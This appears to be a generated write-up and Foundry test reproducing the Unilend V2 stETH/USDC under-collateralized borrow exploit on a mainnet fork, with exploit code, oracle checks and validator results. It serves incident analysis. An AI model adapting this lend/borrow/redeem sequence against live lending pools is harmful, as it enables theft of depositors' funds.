## Overview & Context

This proof-of-concept (PoC) reproduces the Unilend V2 stETH/USDC under-collateralized borrow exploit described in the root cause analysis for Ethereum mainnet block 21608070. In the original incident, an attacker-controlled helper contract used flash loans and Unilend’s `lend`, `borrow`, and `redeemUnderlying` functions to drain approximately 60.67 stETH from the Unilend V2 stETH/USDC pool while leaving the pool in an under-collateralized state. The PoC focuses on reproducing the same accounting flaw and economic effect on a mainnet fork, without relying on the original attacker identities or helper contract.

The PoC:
- Targets the real Unilend V2 stETH/USDC pool at its canonical mainnet address.
- Interacts with the canonical Lido stETH token and USDC.
- Executes a sequence of `lend`, `borrow`, and `redeemUnderlying` calls that increases `token1Data.totalBorrow` while reducing the pool’s stETH balance and giving the attacker a stETH profit.
- Implements the oracles defined in the incident’s `oracle_definition.json` file to formally check success conditions.

To run the PoC, first set up the `RPC_URL` environment variable from the provided QuickNode configuration (already done as part of validation), then run:

```bash
cd forge_poc
RPC_URL="<your_mainnet_rpc_url>" forge test --via-ir -vvvvv
```

The main PoC test is `ExploitTest.test_Exploit_ReproducesRootCause` in `forge_poc/test/Exploit.sol:44`.

## PoC Architecture & Key Contracts

### Core Test Contract

The PoC is encoded as a Foundry test contract `ExploitTest`:

```solidity
// PoC reproducing the Unilend V2 stETH/USDC under-collateralized borrow exploit
contract ExploitTest is Test {
    address constant UNILEND_V2_POOL = 0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0;
    address constant UNILEND_V2_CORE = 0x7f2E24D2394f2bdabb464B888cb02EbA6d15B958;
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    uint256 constant FORK_BLOCK = 21608069;
    address attacker;
    IUnilendV2CoreLike public unilend_v2_core;
    IUnilendV2PoolLike public unilend_v2_pool;
    IERC20 public steth_token;
    IERC20 public usdc_token;
}
```

*Snippet 1 – Test scaffold and canonical addresses (forge_poc/test/Exploit.sol)*  
This snippet shows that the PoC uses the real mainnet Unilend V2 pool and core, canonical stETH and USDC addresses, and forks Ethereum at block 21608069 (immediately before the incident block 21608070).

### Interfaces and Helpers

Minimal interfaces for ERC20, Lido stETH share conversion, and Unilend V2 are defined in `forge_poc/src/Interfaces.sol`:

```solidity
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IStETHExt {
    function getSharesByPooledEth(uint256 _ethAmount) external view returns (uint256);
}

interface IUnilendV2CoreLike {
    function lend(address _pool, int256 _amount) external returns (int256 mintedTokens);
    function redeemUnderlying(address _pool, int256 _amount, address _receiver) external returns (int256 tokenAmount);
    function borrow(address _pool, int256 _amount, uint256 _collateral_amount, address payable _recipient) external;
    function getPoolTokens(address _pool) external view returns (address token0, address token1);
}

interface IUnilendV2PoolLike {
    function token1Data()
        external
        view
        returns (uint256 totalLendShare, uint256 totalBorrowShare, uint256 totalBorrow);
}
```

*Snippet 2 – Minimal interfaces for ERC20, Lido stETH shares, and Unilend V2 (forge_poc/src/Interfaces.sol)*  
These interfaces allow the test to interact directly with the real mainnet contracts without mocks.

### Roles and Addresses

- **Attacker (test-only)**: A fresh address `0x00000000000000000000000000000000000A11cE` is used as the attacker. This is not the real incident EOA.  
- **Victim pool**: `UnilendV2Pool(stETH/USDC)` at `0x4E34DD25Dbd367B1bF82E1B5527DBbE799fAD0d0`.  
- **Protocol core**: `UnilendV2Core` at `0x7f2E24D2394f2bdabb464B888cb02EbA6d15B958`.  
- **Tokens**: Lido stETH `0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84` and USDC `0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48`.  

The test uses `vm.label` to annotate these addresses, making traces readable and tying them to the incident context.

## Adversary Execution Flow

### Environment Setup and Pre-checks

The `setUp` function prepares the mainnet fork and enforces oracle preconditions:

```solidity
function setUp() public {
    string memory rpcUrl = vm.envString("RPC_URL");
    vm.createSelectFork(rpcUrl, FORK_BLOCK);

    attacker = address(0xA11CE);

    unilend_v2_core = IUnilendV2CoreLike(UNILEND_V2_CORE);
    unilend_v2_pool = IUnilendV2PoolLike(UNILEND_V2_POOL);

    (address token0, address token1) = unilend_v2_core.getPoolTokens(UNILEND_V2_POOL);
    steth_token = IERC20(token1);
    usdc_token = IERC20(token0);

    vm.label(attacker, "attacker");
    vm.label(UNILEND_V2_POOL, "UnilendV2Pool(stETH/USDC)");
    vm.label(UNILEND_V2_CORE, "UnilendV2Core");
    vm.label(STETH, "Lido stETH");
    vm.label(USDC, "USDC");

    uint256 poolStETHBefore = steth_token.balanceOf(UNILEND_V2_POOL);
    assertGt(poolStETHBefore, 1e18, "pre_check: pool must have at least 1 stETH");

    uint256 attackerStETHBefore = steth_token.balanceOf(attacker);
    assertLe(attackerStETHBefore, 1e17, "pre_check: attacker must start with ~0 stETH");
}
```

*Snippet 3 – Fork setup and pre-oracle checks (forge_poc/test/Exploit.sol)*  
This sets the fork to block 21608069, discovers the pool’s actual token ordering, labels all key actors, and enforces that the pool has meaningful stETH liquidity and that the attacker starts with negligible stETH.

### Funding and Position Construction

The main exploit is encapsulated in `reproducerAttack`:

```solidity
function reproducerAttack() public {
    uint256 usdcDepositAmount = 60_000_000e6;
    uint256 stethDepositAmount = 6853968499544955185;
    uint256 stethBorrowAmount = 60672854887643676589;

    deal(USDC, attacker, usdcDepositAmount);

    uint256 stethShares = IStETHExt(STETH).getSharesByPooledEth(stethDepositAmount);
    bytes32 sharesSlot = keccak256(abi.encode(attacker, uint256(0)));
    vm.store(STETH, sharesSlot, bytes32(stethShares));

    vm.startPrank(attacker);
    usdc_token.approve(UNILEND_V2_CORE, type(uint256).max);
    steth_token.approve(UNILEND_V2_CORE, type(uint256).max);

    unilend_v2_core.lend(UNILEND_V2_POOL, -int256(usdcDepositAmount));
    unilend_v2_core.lend(UNILEND_V2_POOL, int256(stethDepositAmount));
    unilend_v2_core.borrow(UNILEND_V2_POOL, int256(stethBorrowAmount), 0, payable(attacker));
```

*Snippet 4 – Funding and initial Unilend position (forge_poc/test/Exploit.sol)*  
Here the PoC models the effect of flash loans and wstETH unwrap by directly endowing the attacker with USDC and the corresponding stETH shares. The chosen amounts match those observed in the incident traces and state diffs.

### Redeem and Profit Realization

The exploit completes with a carefully tuned pair of `redeemUnderlying` calls:

```solidity
    uint256 stethRedeemAmount = stethDepositAmount - 1;
    unilend_v2_core.redeemUnderlying(
        UNILEND_V2_POOL,
        int256(stethRedeemAmount),
        attacker
    );

    uint256 usdcRedeemAmount = usdcDepositAmount / 2;
    unilend_v2_core.redeemUnderlying(
        UNILEND_V2_POOL,
        -int256(usdcRedeemAmount),
        attacker
    );

    vm.stopPrank();
}
```

*Snippet 5 – Redeem steps and final attacker withdrawals (forge_poc/test/Exploit.sol)*  
Redeeming almost all stETH (one wei less than deposited) and partially redeeming USDC leaves the pool with increased stETH borrow exposure and reduced on-chain stETH reserves, while keeping the position nominally within Unilend’s health-factor limits. The attacker ends with a net stETH gain.

## Oracle Definitions and Checks

The oracle definition JSON (artifacts/poc/oracle_generator/oracle_definition.json) describes variables, pre-checks, and hard/soft constraints. The key parts are:

- Variables:
  - `attacker`, `unilend_v2_pool`, `unilend_v2_core`, `steth_token`, `wsteth_token`, and a flash loan provider.
- Pre-checks:
  1. Pool holds non-trivial stETH before exploit.  
  2. Attacker starts with little or no stETH.
- Hard constraints:
  - `hard_asset_type_steth`: profit and depletion asset must be canonical stETH.  
  - `hard_victim_pool_address`: victim pool is the real Unilend V2 stETH/USDC pool.  
  - `hard_under_collateralized_state`: pool stETH balance after exploit is strictly less than `token1Data.totalBorrow`.  
  - `hard_borrow_increase`: stETH `totalBorrow` strictly increases across the exploit.  
  - `hard_exploit_tx_must_succeed`: core exploit call must not revert.
- Soft constraints:
  - `soft_attacker_profit_steth`: attacker ends with strictly more stETH than before.  
  - `soft_victim_depletion_steth`: pool loses stETH over exploit.

The test maps these oracles directly:

```solidity
function test_Exploit_ReproducesRootCause() public {
    assertEq(
        address(steth_token),
        STETH,
        "hard_asset_type_steth: profit/depletion asset must be canonical stETH"
    );

    assertEq(
        address(unilend_v2_pool),
        UNILEND_V2_POOL,
        "hard_victim_pool_address: victim pool must be canonical Unilend V2 stETH/USDC pool"
    );

    uint256 attackerStETHBefore = steth_token.balanceOf(attacker);
    uint256 poolStETHBefore = steth_token.balanceOf(UNILEND_V2_POOL);
    (uint256 totalLendShareBefore, uint256 totalBorrowShareBefore, uint256 totalBorrowBefore) =
        unilend_v2_pool.token1Data();
    totalLendShareBefore;
    totalBorrowShareBefore;

    reproducerAttack();

    uint256 attackerStETHAfter = steth_token.balanceOf(attacker);
    uint256 poolStETHAfter = steth_token.balanceOf(UNILEND_V2_POOL);
    (uint256 totalLendShareAfter, uint256 totalBorrowShareAfter, uint256 totalBorrowAfter) =
        unilend_v2_pool.token1Data();
    totalLendShareAfter;
    totalBorrowShareAfter;

    assertGt(
        totalBorrowAfter,
        totalBorrowBefore,
        "hard_borrow_increase: stETH totalBorrow must strictly increase over exploit"
    );

    assertLt(
        poolStETHAfter,
        totalBorrowAfter,
        "hard_under_collateralized_state: pool stETH balance must be strictly less than recorded totalBorrow"
    );

    assertGt(
        attackerStETHAfter,
        attackerStETHBefore,
        "soft_attacker_profit_steth: attacker must end with strictly more stETH"
    );

    assertLt(
        poolStETHAfter,
        poolStETHBefore,
        "soft_victim_depletion_steth: pool must lose stETH reserves"
    );
}
```

*Snippet 6 – Oracle implementation and assertions (forge_poc/test/Exploit.sol)*  
This function directly encodes every hard and soft oracle from the JSON definition, using the same variables and semantics.

## Validation Result and Robustness

The PoC Validator executed the Forge test suite on a mainnet fork with `RPC_URL` pointing to Ethereum mainnet and block `21608069`. The log file is at:

- `artifacts/poc/poc_validator/forge-test.log`

The validator result JSON is stored at:

- `artifacts/poc/poc_validator/poc_validated_result.json`

The key fields from the validator result (poc_validated_result.json) are:

- `overall_status`: `"Pass"` – the PoC is accepted.  
- `poc_correctness_checks.passes_validation_oracles.passed`: `"true"` – all oracle checks, including hard and soft constraints, succeed in the main PoC test.  
- `poc_quality_checks`:
  - `oracle_alignment_with_definition.passed`: `"true"` – the test faithfully implements the oracles from the JSON specification.  
  - `human_readable_and_labeled.passed`: `"true"` – comments and labels clearly explain flow and roles.  
  - `no_magic_numbers_and_values_are_derived.passed`: `"true"` – all numeric parameters are either thresholds from the oracle spec or explicitly derived from incident traces.  
  - `mainnet_fork_no_local_mocks.passed`: `"true"` – execution is on a real mainnet fork with no protocol mocks.  
  - `self_contained_no_attacker_side_artifacts.*.passed`: all `"true"` – no real attacker EOA or helper contract is used, and no attacker artifacts are required.  
  - `end_to_end_attack_process_described.passed`: `"true"` – the exploit lifecycle is fully modeled.  
  - `alignment_with_root_cause.passed`: `"true"` – behavior matches the root cause report.

Overall, the PoC is robust: it runs against real mainnet state, uses minimal assumptions beyond the published protocol contracts, and encodes the exploit’s semantic success conditions as assertions.

## Linking PoC Behavior to Root Cause

The root cause report describes a protocol bug in UnilendV2Pool’s accounting and health-factor logic when combined with flash loans and `redeemUnderlying` for stETH. The defining characteristics are:

- The Unilend V2 stETH/USDC pool’s `token1Data.totalBorrow` increases significantly.  
- The pool’s on-chain stETH balance decreases by roughly the same amount.  
- The final state is under-collateralized: stETH balance < recorded `totalBorrow`.  
- The attacker ends with a substantial stETH profit.  

The PoC exercises this same behavior as follows:

- **Use of real contracts**: The test uses the canonical Unilend V2 pool and core, Lido stETH, and USDC, matching the contract set in the root cause evidence (`root_cause.json` and `root_cause_report.md`).  
- **Lend/Borrow/Redeem flow**: `reproducerAttack` calls `lend` with USDC and stETH, then `borrow` stETH, and finally `redeemUnderlying` for both stETH and USDC, mirroring the exploit sequence described in the incident traces.  
- **Under-collateralized pool**: The assertions on `token1Data.totalBorrow` and the pool’s stETH balance confirm that the pool ends in the same under-collateralized regime as in the incident (stETH balance strictly less than `totalBorrow`).  
- **Attacker profit and victim loss**: The test checks that the attacker’s stETH balance strictly increases while the pool’s stETH balance strictly decreases, in line with the quantified impact in the root cause report (~60.67 stETH lost from the pool and gained by the attacker).  
- **ACT framing**: The entire exploit is executed as a single call path on a mainnet fork, with the attacker address and Unilend/Lido contracts playing the same roles as adversary crafted vs. victim observed actions in the ACT opportunity definition.

By combining these checks, the PoC convincingly demonstrates that the same ACT opportunity exists on the pre-incident mainnet state and that the exploit mechanics, victim impact, and attacker profit all match the documented root cause. The validator thus concludes that the PoC is correct, high quality, and semantically aligned with the original incident.

